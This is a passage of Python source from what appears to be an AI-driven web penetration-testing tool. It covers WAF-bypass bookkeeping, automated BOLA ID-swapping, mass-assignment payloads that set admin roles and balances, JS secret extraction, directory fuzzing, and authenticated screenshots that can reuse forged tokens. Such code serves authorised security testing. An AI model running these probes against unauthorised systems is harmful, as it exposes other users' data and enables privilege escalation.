        elif attempts:
            add_lesson(
                technique=f"Standard encoding/case/whitespace WAF-evasion mutations for {payload_type} payloads",
                outcome="failed",
                tech_signature=tech_sig,
                note="None of the tried mutations (" + ", ".join(a.get("mutation", "?") for a in attempts) + ") got past this WAF.",
                target_name=target.name if target else "",
            )
    except Exception:
        pass

    return {
        "url": url,
        "param": param,
        "method": method,
        "original_payload": payload,
        "attempts": attempts,
        "bypass_found": winning is not None,
        "winning_mutation": winning,
        "note": (
            "A mutation getting a non-blocked response means it got PAST the WAF — it does NOT by itself "
            "confirm the vulnerability still triggers. Re-verify impact with this exact mutated payload "
            "(reflection check, sqlmap_scan, OOB listener, etc.) before recording a finding."
            if winning else
            "None of the tried mutations got past this WAF. Consider a different injection point, a slower "
            "delivery path (out-of-band), or that this may not be bypassable with encoding-level tricks alone."
        ),
    }


# ──────────────────────────────────────────────────────────────────────────
# Schema-driven BOLA / mass-assignment fuzzing
# ──────────────────────────────────────────────────────────────────────────
#
# Consumes the endpoint/param table spider.py's probe_openapi() (and
# ordinary crawling) already builds into target.state["spider_intel"]
# instead of asking the model to guess endpoints blind. Two checks, each
# capped and signal-gated rather than blasting every endpoint:
#
#   BOLA (horizontal privilege escalation): endpoints with a numeric ID in
#   the path or an id-like query param get ONE adjacent-ID mutation tried
#   (id+1 / id-1) with the SAME session, comparing against the baseline.
#
#   Mass assignment: POST/PUT/PATCH endpoints with known body params get a
#   single request carrying the legitimate params PLUS a batch of common
#   privilege/financial fields the client was never supposed to be able to
#   set, checking whether the server echoes/accepts them.
#
# Both only ever report a SIGNAL for the model to confirm — consistent with
# this file's non-determinism/false-positive discipline, this tool does not
# call record_finding itself.

_ID_PATH_RE = re.compile(r'^\d+$')
_UUID_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
_ID_PARAM_NAME_RE = re.compile(r'(^id$|_id$|^uid$|^uuid$)', re.I)

# Leaf field names (case-insensitive, last path segment of a flattened JSON
# key) worth diffing between a BOLA baseline and mutated-ID response. A
# difference in one of THESE specifically is real evidence the mutated ID
# returned a different identity's data — unlike a raw whole-body diff, which
# flips on a timestamp or CSRF token with zero relation to whose data it is.
_BOLA_IDENTITY_FIELDS = frozenset({
    "email", "useremail", "user_email", "username", "user_name", "name",
    "fullname", "full_name", "firstname", "first_name", "lastname",
    "last_name", "displayname", "display_name", "phone", "phonenumber",
    "phone_number", "address", "accountid", "account_id", "userid",
    "user_id", "ssn", "dob", "dateofbirth",
})

_MASS_ASSIGNMENT_FIELDS: Dict[str, Any] = {
    "role": "admin", "isAdmin": True, "is_admin": True, "admin": True,
    "permissions": ["admin"], "privilege": "admin", "account_type": "admin",
    "verified": True, "is_verified": True, "premium": True,
    "balance": 999999, "price": 0, "discount": 100, "approved": True,
}


def _execute_schema_fuzz(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {}) or {}
    endpoints = spider_intel.get("endpoints", []) if isinstance(spider_intel, dict) else []
    if not endpoints:
        return {"error": "No endpoints in spider_intel yet — run 'spider' first so this has a param table to work from."}

    max_checks = max(1, min(int(args.get("max_checks", 8) or 8), 15))  # bounded — not a blind fuzzer
    checks_do = (args.get("checks") or "bola,mass_assignment").lower()

    auth_opts = _target_auth_options(target)
    headers = {"User-Agent": "Hellhound/1.0"}
    headers.update(auth_opts.get("auth_headers", {}))
    cookies = auth_opts.get("auth_cookies", {})

    bola_results = []
    mass_assignment_results = []

    # ---- BOLA: adjacent-ID swap on endpoints with a path/query ID ----
    if "bola" in checks_do:
        bola_candidates = []
        for ep in endpoints:
            url = ep.get("url", "")
            if not url:
                continue
            try:
                parsed = urlparse(url)
            except Exception:
                continue
            segs = parsed.path.split("/")
            found = False
            for i, seg in enumerate(segs):
                if _ID_PATH_RE.match(seg):
                    try:
                        orig_int = int(seg)
                    except Exception:
                        continue
                    mutated_int = orig_int + 1 if orig_int < 10 ** 9 else orig_int - 1
                    new_segs = list(segs)
                    new_segs[i] = str(mutated_int)
                    mutated_url = urlunparse((parsed.scheme, parsed.netloc, "/".join(new_segs), parsed.params, parsed.query, parsed.fragment))
                    bola_candidates.append({"url": url, "mutated_url": mutated_url, "method": ep.get("method", "GET"), "kind": "path_numeric_id"})
                    found = True
                    break
                if _UUID_RE.match(seg):
                    # Can't guess a valid adjacent UUID — flag as needing a
                    # manually-supplied second ID rather than silently skip.
                    bola_candidates.append({"url": url, "mutated_url": None, "method": ep.get("method", "GET"), "kind": "path_uuid_unguessable"})
                    found = True
                    break
            if not found and parsed.query:
                for pname, pval in parse_qsl(parsed.query):
                    if _ID_PARAM_NAME_RE.search(pname) and pval.strip():
                        if _ID_PATH_RE.match(pval.strip()):
                            mutated_val = str(int(pval) + 1)
                            mutated_url = url.replace(f"{pname}={pval}", f"{pname}={mutated_val}")
                            bola_candidates.append({"url": url, "mutated_url": mutated_url, "method": ep.get("method", "GET"), "kind": f"query_param_id ({pname})"})
                        else:
                            bola_candidates.append({"url": url, "mutated_url": None, "method": ep.get("method", "GET"), "kind": f"query_param_id_unguessable ({pname})"})
                        break

        for cand in bola_candidates[:max_checks]:
            if not cand["mutated_url"]:
                bola_results.append({**cand, "tested": False, "note": "No numeric ID to mutate automatically — try this one manually with a second known object ID (e.g. another test account)."})
                continue
            try:
                r_base = _bounded_request(lambda: requests.request(cand["method"], cand["url"], headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False))
                r_mut = _bounded_request(lambda: requests.request(cand["method"], cand["mutated_url"], headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False))
                raw_diff = (
                    r_mut.status_code == 200
                    and r_base.status_code == 200
                    and len(r_mut.text or "") > 20
                    and r_mut.text != r_base.text
                )

                # Raw body-diff alone is noisy — a timestamp, nonce, or CSRF
                # token embedded anywhere in the page flips `text != text`
                # even when the object is identical, which is exactly why
                # this was "possible_bola" with a manual-confirm caveat
                # rather than something closer to proof. Where both
                # responses parse as JSON, diff identity-revealing fields
                # specifically (email, username, name, phone, account ids)
                # instead of the whole blob — if those differ between the
                # SAME session's baseline and mutated-ID response, that's a
                # much stronger signal the mutated ID actually belongs to a
                # different real identity, not noise elsewhere in the body.
                identity_diff: Dict[str, List[Any]] = {}
                confirmation_level = "weak"
                if raw_diff:
                    try:
                        base_json = r_base.json()
                        mut_json = r_mut.json()
                        base_flat = _flatten_json_dict(base_json) if isinstance(base_json, (dict, list)) else {}
                        mut_flat = _flatten_json_dict(mut_json) if isinstance(mut_json, (dict, list)) else {}
                        for fk, fv in mut_flat.items():
                            leaf = fk.split(".")[-1].split("[")[0].lower()
                            if leaf in _BOLA_IDENTITY_FIELDS:
                                base_v = base_flat.get(fk)
                                if base_v is not None and fv is not None and base_v != fv and str(fv).strip():
                                    identity_diff[fk] = [base_v, fv]
                        if identity_diff:
                            confirmation_level = "strong"
                    except Exception:
                        pass  # non-JSON or unparseable response — fall back to the raw body-diff signal below

                suspicious = raw_diff
                if suspicious and confirmation_level == "strong":
                    note = (
                        f"STRONG signal: identity-revealing field(s) {list(identity_diff.keys())} actually "
                        f"differ between YOUR session's baseline response and the mutated-ID response "
                        f"(e.g. {next(iter(identity_diff.values()))}) — this is real evidence the mutated ID "
                        f"returned a DIFFERENT identity's data, not just incidental body noise (timestamps, "
                        f"nonces, CSRF tokens). Still confirm the mutated ID genuinely belongs to someone else "
                        f"(not a second resource of your own) before recording a finding."
                    )
                elif suspicious:
                    note = (
                        "WEAK signal: mutated ID returned 200 with a different body using the SAME session, but "
                        "no identity-revealing field could be diffed (non-JSON response, or no "
                        "email/username/name/id-type field present) — this could just as easily be a timestamp, "
                        "nonce, or CSRF token changing. Manually confirm the returned object actually belongs to "
                        "a different user/account before recording a finding."
                    )
                else:
                    note = "No signal — same status/body pattern, or mutated ID was rejected."

                bola_results.append({
                    **cand, "tested": True,
                    "baseline_status": r_base.status_code, "mutated_status": r_mut.status_code,
                    "baseline_body_len": len(r_base.text or ""), "mutated_body_len": len(r_mut.text or ""),
                    "possible_bola": suspicious,
                    "confirmation_level": confirmation_level if suspicious else None,
                    "identity_fields_diff": identity_diff or None,
                    "note": note,
                })
            except Exception as e:
                bola_results.append({**cand, "tested": False, "error": str(e)})

    # ---- Mass assignment: inject extra privileged fields into one write ----
    if "mass_assignment" in checks_do:
        ma_candidates = [
            ep for ep in endpoints
            if ep.get("method", "GET").upper() in ("POST", "PUT", "PATCH")
            and (ep.get("params") or ep.get("params_detail"))
        ][:max_checks]

        for ep in ma_candidates:
            url = ep.get("url", "")
            method = ep.get("method", "POST").upper()
            legit_params = ep.get("params") or []
            body = {p: "test" for p in legit_params if p}
            body.update(_MASS_ASSIGNMENT_FIELDS)
            try:
                r = _bounded_request(lambda: requests.request(method, url, headers={**headers, "Content-Type": "application/json"},
                                      cookies=cookies, json=body, timeout=10, verify=False, allow_redirects=False))
                accepted_fields = []
                if r.status_code in (200, 201, 202, 204):
                    try:
                        resp_json = r.json()
                        flat = _flatten_json_dict(resp_json) if isinstance(resp_json, (dict, list)) else {}
                        for extra_field in _MASS_ASSIGNMENT_FIELDS:
                            for fk, fv in flat.items():
                                if fk.split(".")[-1].lower() == extra_field.lower() and fv == _MASS_ASSIGNMENT_FIELDS[extra_field]:
                                    accepted_fields.append(extra_field)
                    except Exception:
                        pass
                mass_assignment_results.append({
                    "url": url, "method": method, "status_code": r.status_code,
                    "injected_fields": list(_MASS_ASSIGNMENT_FIELDS.keys()),
                    "fields_echoed_back_as_sent": accepted_fields,
                    "possible_mass_assignment": bool(accepted_fields) or r.status_code in (200, 201, 202),
                    "note": (
                        f"Response echoed back {accepted_fields} exactly as injected — strong signal the server "
                        f"bound these client-supplied fields directly. Confirm by checking actual effect (does a "
                        f"follow-up GET on this object show the privilege/balance change?) before recording."
                        if accepted_fields else
                        f"Got {r.status_code} without validation rejecting the extra fields by name — body didn't "
                        f"clearly echo them though. Weaker signal; check manually whether any field actually took effect."
                        if r.status_code in (200, 201, 202) else
                        "Request was rejected — no mass-assignment signal here."
                    ),
                })
            except Exception as e:
                mass_assignment_results.append({"url": url, "method": method, "error": str(e)})

    return {
        "bola": bola_results,
        "mass_assignment": mass_assignment_results,
        "summary": (
            f"BOLA: {sum(1 for b in bola_results if b.get('possible_bola'))} suspicious / {len(bola_results)} tested. "
            f"Mass assignment: {sum(1 for m in mass_assignment_results if m.get('possible_mass_assignment'))} suspicious / {len(mass_assignment_results)} tested."
        ),
    }


def _execute_hydra(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Execute Hydra parameter and logic flaw analysis across discovered endpoints."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    if not spider_intel and "endpoints" in target.state:
        spider_intel = {"endpoints": [{"url": ep} if isinstance(ep, str) else ep for ep in target.state.get("endpoints", [])]}

    concurrency = args.get("concurrency", 10)
    enable_probing = args.get("enable_probing", False)
    opts = {
        "spider_intel": spider_intel,
        "concurrency": concurrency,
        "enable_probing": enable_probing,
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("hydra", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        surfaces = intel.get("surfaces", [])
        logic_chains = intel.get("logic_chains", [])
        vulns = intel.get("vulnerabilities", [])

        for v in vulns:
            finding = {
                "type": f"Logic Flaw / Param Anomaly ({v.get('parameter', '')})",
                "target": v.get("url", url),
                "severity": "HIGH" if v.get("impact_score", 0) >= 8 else "MEDIUM",
                "details": v.get("impact_path") or v.get("attack_chains", []),
                "verified": False
            }
            if finding not in target.findings:
                target.findings.append(finding)

        return {
            "url": url,
            "raw": res.get("raw", "") if isinstance(res, dict) else str(res),
            "surfaces_analyzed": len(surfaces),
            "logic_chains_found": len(logic_chains),
            "high_impact_vulnerabilities": len(vulns),
            "signals": res.get("signals", []) if isinstance(res, dict) else [],
            "top_findings": surfaces[:10]
        }
    except Exception as e:
        return {"url": url, "error": f"Hydra analysis error: {e}"}


def _execute_cloudscout(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan application and recon text for cloud infrastructure assets."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    verify_public = args.get("verify_public", False)
    opts = {
        "spider_intel": spider_intel,
        "verify_public": verify_public
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("cloudscout", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        assets = intel.get("assets", [])
        providers = intel.get("providers", [])
        return {
            "url": url,
            "assets_found": len(assets),
            "providers": providers,
            "assets": assets[:25],
            "risk_score": intel.get("risk_score", 0),
            "signals": intel.get("signals", [])
        }
    except Exception as e:
        return {"url": url, "error": f"CloudScout error: {e}"}


def _execute_js_static_analysis(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Reconstruct and statically audit this target's client-side JS: find and
    unpack exposed sourcemaps (BlobUnpacker — recovers original file
    names/structure, hunts minified bundles for hardcoded secrets/API keys/
    endpoints) THEN run the recovered source through signature-based sink
    detection (SourceAuditor — eval()/dangerouslySetInnerHTML, hardcoded
    admin/role checks, localStorage misuse, hardcoded credentials, internal
    URLs, client-side SQL string concatenation, insecure transport, hidden
    admin/debug routes).

    Both of these existed in the codebase as fully-built, working modules
    that were never wired into the tool registry — not a new capability
    being invented here, just connecting two pieces that already worked
    standalone. Chained together because SourceAuditor's real value (sink
    detection on ACTUAL recovered source, not minified noise) depends on
    BlobUnpacker having found something to feed it; calling them separately
    would just mean manually passing one's output into the other's options
    every time.
    """
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    base_opts = {"spider_intel": spider_intel}
    base_opts.update(_target_auth_options(target))

    engine = HellhoundEngine()

    try:
        blob_res = engine.run_single("blobunpacker", url, options=dict(base_opts), emit=emit)
    except Exception as e:
        return {"url": url, "error": f"BlobUnpacker error: {e}"}

    blob_intel = blob_res.get("intel", {}) if isinstance(blob_res, dict) else {}
    reconstructed = blob_intel.get("reconstructed", [])
    secrets = blob_intel.get("secrets", [])
    new_endpoints = blob_intel.get("new_endpoints", [])

    if not reconstructed and not blob_intel.get("minified_content"):
        # Nothing to statically audit — no point calling SourceAuditor on
        # an empty source tree, that's just a wasted request/turn.
        return {
            "url": url,
            "status": "no_sourcemaps_or_bundles_found",
            "secrets_found_in_minified_js": len(secrets),
            "secrets": secrets[:25],
            "new_endpoints_found": len(new_endpoints),
            "new_endpoints": new_endpoints[:50],
            "note": "No sourcemaps recovered and no JS bundles reachable to statically audit — BlobUnpacker's own direct secret/endpoint scan of whatever JS it DID fetch is above, if anything.",
        }

    # use_ai defaults OFF — SourceAuditor's optional LLM-verification pass
    # calls its own separately-configured AI provider (gemini by default)
    # to cut false positives on sink findings; left opt-in so this doesn't
    # silently start making extra model calls nobody asked for.
    sa_opts = {
        "blobunpacker_intel": blob_intel,
        "use_ai": bool(args.get("use_ai", False)),
    }
    try:
        sa_res = engine.run_single("sourceauditor", url, options=sa_opts, emit=emit)
    except Exception as e:
        return {
            "url": url,
            "error": f"SourceAuditor error: {e}",
            "secrets_found_in_minified_js": len(secrets),
            "new_endpoints_found": len(new_endpoints),
        }

    sa_intel = sa_res.get("intel", {}) if isinstance(sa_res, dict) else {}
    # SourceAuditor's own key is "vulnerabilities", not "findings" — checked
    # its actual return shape rather than assuming.
    findings = sa_intel.get("vulnerabilities", []) if isinstance(sa_intel, dict) else []

    return {
        "url": url,
        "files_recovered": len(reconstructed),
        "secrets_found": len(secrets),
        "secrets": secrets[:25],
        "new_endpoints_found": len(new_endpoints),
        "new_endpoints": new_endpoints[:50],
        "static_analysis_findings": len(findings),
        "findings": findings[:50],
        "risk_score": sa_intel.get("risk_score", blob_intel.get("risk_score", 0)),
    }


def _execute_jsluice(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    JS endpoint/secret extraction via jsluice (BishopFox) — the
    researcher's preferred alternative to BlobUnpacker's own JS secret/
    endpoint scan when they want jsluice specifically (it parses the
    actual JS AST rather than BlobUnpacker's regex-based scan, so it finds
    structurally-embedded URLs/secrets BlobUnpacker's patterns can miss,
    at the cost of not doing BlobUnpacker's other job — sourcemap
    unpacking). Use this when the researcher names jsluice directly, or
    js_static_analysis (BlobUnpacker) crashed/came back empty and a second
    pass with a different tool is worth trying on the same JS files.

    jsluice itself only operates on local files, not live URLs, so this
    fetches each JS file's content first (reusing the target's already-
    captured session the same way every other tool here does) and feeds
    it to `jsluice urls` / `jsluice secrets` as temp files.
    """
    js_urls = args.get("js_urls")
    if isinstance(js_urls, str):
        js_urls = [js_urls]
    if not js_urls:
        single = args.get("url")
        if single:
            js_urls = [single]
    if not js_urls:
        # Fall back to whatever JS files spider/katana already discovered
        # for this target this session, rather than making the researcher
        # re-list every .js URL by hand.
        js_urls = list(target.state.get("js_routes", []) or [])[:20]
    if not js_urls:
        return {
            "error": "No JS file(s) to analyze — pass 'js_urls' (or 'url' for a single file), or run spider/katana first so this can pick up discovered JS files automatically.",
        }

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("jsluice", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "jsluice not installed",
            "message": check["message"],
            "hint": "go install github.com/BishopFox/jsluice/cmd/jsluice@latest",
            "note": "js_static_analysis (BlobUnpacker) still works without jsluice — use that instead if jsluice can't be installed right now.",
        }

    binary = get_binary_path("jsluice") or "jsluice"
    auth_opts = _target_auth_options(target)
    fetch_headers = dict(auth_opts.get("auth_headers") or {})
    fetch_cookies = dict(auth_opts.get("auth_cookies") or {})

    import tempfile
    all_urls: List[Dict[str, Any]] = []
    all_secrets: List[Dict[str, Any]] = []
    fetched = []
    fetch_errors = []

    with tempfile.TemporaryDirectory(prefix="hh_jsluice_") as tmpdir:
        local_files = []
        for js_url in js_urls[:20]:
            try:
                r = _bounded_request(lambda u=js_url: requests.get(
                    u, headers=fetch_headers, cookies=fetch_cookies, timeout=15, verify=False
                ))
                if r.status_code >= 400 or not r.text:
                    fetch_errors.append(f"{js_url}: HTTP {r.status_code}")
                    continue
                fname = os.path.join(tmpdir, f"js_{len(local_files)}.js")
                with open(fname, "w", encoding="utf-8", errors="replace") as f:
                    f.write(r.text)
                local_files.append(fname)
                fetched.append(js_url)
            except Exception as e:
                fetch_errors.append(f"{js_url}: {e}")

        if not local_files:
            return {
                "error": "Could not fetch any of the given JS file(s) to analyze.",
                "fetch_errors": fetch_errors,
            }

        for subcmd, sink in (("urls", all_urls), ("secrets", all_secrets)):
            try:
                proc = _run_cmd_with_heartbeat(
                    [binary, subcmd, *local_files], timeout=45, emit=emit,
                    label=f"jsluice {subcmd} ({len(local_files)} file(s))"
                )
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                logger.warning(f"jsluice {subcmd} execution failed: {e}")
                continue
            for line in (proc.stdout or "").splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except Exception:
                    continue
                if isinstance(rec, dict):
                    sink.append(rec)

    # Normalize into the same shape extract_and_store_artifacts/record_finding
    # already know how to read from other recon tools, rather than a
    # jsluice-specific schema nothing downstream understands.
    new_endpoints = []
    for rec in all_urls:
        u = rec.get("url") or rec.get("path") or rec.get("endpoint")
        if u and str(u).strip() and str(u) not in new_endpoints:
            new_endpoints.append(str(u).strip())

    secrets_exposed = []
    for rec in all_secrets:
        data = rec.get("data") if isinstance(rec.get("data"), dict) else {}
        value = data.get("key") or data.get("secret") or data.get("value") or data.get("token")
        secrets_exposed.append({
            "kind": rec.get("kind") or rec.get("type") or "secret",
            "value": value,
            "raw": rec if not value else None,  # keep the full record only when we couldn't pull a clean value out of it
        })

    if new_endpoints and hasattr(target, "state"):
        try:
            update_from_spider(target, endpoints=new_endpoints)
            save_target(target)
        except Exception:
            pass

    return {
        "files_analyzed": len(fetched),
        "fetched_urls": fetched,
        "fetch_errors": fetch_errors or None,
        "new_endpoints_found": len(new_endpoints),
        "new_endpoints": new_endpoints[:50],
        "secrets_found": len(secrets_exposed),
        "secrets_exposed": secrets_exposed[:25],
        "note": (
            "jsluice's exact JSON field names can vary by version — if 'secrets_exposed' entries "
            "show up with raw!=null instead of a clean value, the raw record is still there to "
            "read manually; the field-name guesses here (data.key/secret/value/token) cover the "
            "common cases but haven't been verified against every jsluice release."
        ) if all_secrets else None,
    }


def _execute_transport_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Audit transport security: SSL certs, HTTPS/HSTS, and cookie security flags."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {
        "spider_intel": spider_intel,
        "check_ssl": args.get("check_ssl", True),
        "check_https": args.get("check_https", True),
        "check_cookies": args.get("check_cookies", True),
        "check_payment": args.get("check_payment", True),
    }
    opts.update(_target_auth_options(target))
    engine = HellhoundEngine()
    try:
        res = engine.run_single("transport_auditor", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        findings = intel.get("findings", [])
        risk_score = res.get("risk_score", 0) if isinstance(res, dict) else 0

        for f in findings:
            if f.get("severity", 0) >= 15:
                finding = {
                    "type": f"Transport Security: {f.get('name', 'Issue')}",
                    "target": url,
                    "severity": "HIGH" if f.get("severity", 0) >= 30 else "MEDIUM",
                    "description": f.get("description", ""),
                    "verified": True
                }
                if finding not in target.findings:
                    target.findings.append(finding)

        return {
            "url": url,
            "findings_count": len(findings),
            "findings": findings,
            "risk_score": risk_score,
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
    except Exception as e:
        return {"url": url, "error": f"Transport auditor error: {e}"}


def _execute_fuzz_hunter_internal(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """The original pure-Python fuzzer (FUZZhunter.py) — baseline-diffing
    404 detection, no external binary required. Used only when neither
    feroxbuster nor ffuf is installed; see _execute_fuzz_hunter for the
    engine-selection logic that decides when this runs."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    # FUZZhunter.run() reads options["depth"] and options["mode"] — NOT
    # "max_depth"/"quick". Those were the exact keys this dict used to
    # send, which meant options.get("depth", 2) and options.get("mode")
    # never matched anything this call ever set, so the module silently
    # fell through to its hardcoded defaults (depth=2, mode="quick" — the
    # 25-word INTERNAL_WORDLIST, never the real SecLists wordlist) on
    # EVERY call regardless of what max_depth/quick the orchestrator
    # actually asked for. The tool always returned a result and never
    # errored, so nothing surfaced this — it just quietly fuzzed the same
    # ~25 common paths every time while reporting success. See the
    # matching fix in FUZZhunter.run() for the "threads" side of this.
    opts = {
        "spider_intel": spider_intel,
        "depth": args.get("max_depth", 2),
        "mode": "quick" if args.get("quick", False) else "deep",
        "threads": args.get("threads", 10),
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("fuzz_hunter", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        endpoints = intel.get("endpoints", [])
        out = {
            "url": url,
            "endpoints_found": len(endpoints),
            "endpoints": endpoints[:30],
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
        # Propagate coverage transparency fields up from the module —
        # without this a "no hidden files found" result is indistinguishable
        # from a properly-covered negative, even when it secretly only
        # tried the 25-word internal fallback list.
        if isinstance(res, dict):
            if "words_tried" in res:
                out["words_tried"] = res["words_tried"]
            if res.get("degraded_coverage_warning"):
                out["degraded_coverage_warning"] = res["degraded_coverage_warning"]
        return out
    except Exception as e:
        return {"url": url, "error": f"FUZZhunter error: {e}"}


def _execute_fuzz_hunter(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Recursive path/content discovery — auto-selects the best engine
    actually available on this machine rather than always running the
    weakest option:
      1. feroxbuster, if installed — purpose-built for recursive content
         discovery, auto-recurses into found directories in one pass.
      2. ffuf, if installed — same real-wordlist coverage as
         content_discovery (this IS content_discovery's own executor,
         reused directly rather than duplicated).
      3. The internal pure-Python fuzzer (FUZZhunter.py) — always
         available, no install required, but limited to a small internal
         wordlist unless a SecLists-style wordlist happens to be on disk
         (see _execute_fuzz_hunter_internal / FUZZhunter.run's
         degraded_coverage_warning).
    This is a fallback CHAIN, not a researcher decision — the model
    doesn't need to know or care which binaries are installed; calling
    fuzz_hunter always gets the strongest tool this machine can actually
    run. Every result is tagged with "engine" so it's visible afterward
    which one actually ran.
    """
    ferox_path = get_binary_path("feroxbuster")
    if ferox_path:
        if emit and hasattr(emit, "info"):
            emit.info(f"[*] fuzz_hunter: feroxbuster found at {ferox_path} — using it (best available engine).")
        result = _execute_feroxbuster_content(args, target, emit)
        if not result.get("error"):
            result["engine"] = "feroxbuster"
            return result
        # feroxbuster is installed but the run itself errored (bad
        # wordlist, crash, etc.) — don't just give up, degrade to the
        # next engine in the chain rather than returning the error as if
        # nothing could be done at all.
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[!] feroxbuster run failed ({result.get('error')}) — falling back to ffuf.")

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    ffuf_check = ensure_tool("ffuf", emit=None, auto_install=auto_install)
    if ffuf_check["available"]:
        if emit and hasattr(emit, "info"):
            emit.info("[*] fuzz_hunter: ffuf found — using it (feroxbuster not available).")
        result = _execute_ffuf_content(args, target, emit)
        if not result.get("error"):
            result["engine"] = "ffuf"
            return result
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[!] ffuf run failed ({result.get('error')}) — falling back to the internal fuzzer.")

    if emit and hasattr(emit, "info"):
        emit.info("[*] fuzz_hunter: neither feroxbuster nor ffuf is installed — using the internal fuzzer (weaker coverage; install one of them for better results).")
    result = _execute_fuzz_hunter_internal(args, target, emit)
    result["engine"] = "internal"
    return result


def _execute_gowitness(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Capture web screenshots via gowitness and store them directly in the target workspace."""
    from datetime import datetime, timezone
    from hellhound.memory import update_from_gowitness

    url = args.get("url") or args.get("target") or ""
    urls = args.get("urls") or []

    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split(",") if u.strip()]

    target_urls: List[str] = []
    if url:
        u = str(url).strip()
        if not u.startswith(("http://", "https://")):
            u = f"https://{u}"
        target_urls.append(u)
    for u in urls:
        u = str(u).strip()
        if u:
            if not u.startswith(("http://", "https://")):
                u = f"https://{u}"
            if u not in target_urls:
                target_urls.append(u)

    if not target_urls:
        t_name = target.name.strip()
        if t_name and t_name != "default":
            if not t_name.startswith(("http://", "https://")):
                target_urls.append(f"https://{t_name}")
            else:
                target_urls.append(t_name)

    if not target_urls:
        return {"error": "No URL or target specified for gowitness screenshot capture."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "gowitness not installed",
            "message": check["message"],
            "hint": "go install github.com/sensepost/gowitness@latest"
        }

    binary = get_binary_path("gowitness") or "gowitness"

    # Setup screenshot output directory
    target_safe_name = sanitize_target_name(target.name)
    custom_dir = args.get("output_dir") or args.get("screenshot_path")
    if custom_dir:
        screenshots_dir = Path(os.path.expanduser(custom_dir)).resolve()
    else:
        screenshots_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_safe_name}/screenshots")).resolve()

    screenshots_dir.mkdir(parents=True, exist_ok=True)

    delay = int(args.get("delay", 2))
    # Default to full-page capture (see ToolSpec description) — omitting
    # `fullpage` entirely used to silently fall back to viewport-only,
    # which cuts off anything below the fold on a real page (a patient
    # records table, admin secrets further down, etc.). Only an explicit
    # `false` opts into a viewport-only shot now.
    fullpage = bool(args.get("fullpage", True))

    # Resolve headers and session cookies for authenticated screenshots
    custom_headers = normalize_headers(args.get("headers"))
    cookies_dict = normalize_cookies(args.get("cookies") or args.get("cookie"))

    # Auto-attach saved session cookies and headers from target.state
    if hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
        for k, v in saved_cookies.items():
            cookies_dict.setdefault(k, v)
        saved_headers = normalize_headers(target.state.get("headers"))
        for k, v in saved_headers.items():
            custom_headers.setdefault(k, v)
        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
        if saved_token and not any(k.lower() == "authorization" for k in custom_headers):
            custom_headers["Authorization"] = f"Bearer {saved_token}"

    # Build cookie header if cookies present
    if cookies_dict:
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
        if not any(k.lower() == "cookie" for k in custom_headers):
            custom_headers["Cookie"] = cookie_header

    merged_headers = merge_global_context({"global_headers": custom_headers})

    chrome_bin = _find_binary("chromium") or _find_binary("google-chrome") or _find_binary("chrome")
    chromedriver_bin = _find_binary("chromedriver")

    captured_items: List[Dict[str, Any]] = []

    # Attempt 1: High-fidelity Selenium + CDP pre-navigation cookie/header injection
    selenium_success = False
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
